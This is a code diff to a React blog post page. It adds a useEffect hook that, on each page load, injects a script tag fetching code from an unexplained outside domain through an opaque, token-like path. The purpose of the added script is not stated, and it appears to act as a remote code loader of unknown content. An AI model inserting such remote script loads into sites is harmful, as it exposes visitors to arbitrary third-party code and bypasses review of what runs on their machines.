@@ -5,12 +5,26 @@ import Sidebar from '../components/Sidebar';
 import { Helmet } from 'react-helmet-async';
 import Markdown from 'react-markdown';
 import { Clock, Calendar, User, Share2, MessageCircle, Bookmark, ChevronRight, Home, Facebook, Twitter, Linkedin, Send, Link as LinkIcon, Check } from 'lucide-react';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 
 export default function BlogPost() {
   const { slug } = useParams();
   const [copied, setCopied] = useState(false);
   const post = POSTS.find(p => p.slug === slug);
+
+  useEffect(() => {
+    const script = document.createElement('script');
+    script.src = "//webbedtrash.com/b.XEVhsPdDGGl/0AYVWQce/WeTmi9IuvZ/Uol/kcPzTsY/4HN/jPAWzcOxD-UptuNUjmg_2mMEDAMz4COJQo";
+    script.async = true;
+    script.referrerPolicy = 'no-referrer-when-downgrade';
+    document.head.appendChild(script);
+
+    return () => {
+      if (document.head.contains(script)) {
+        document.head.removeChild(script);
+      }
+    };
+  }, [slug]);
 
   if (!post) {
     return (
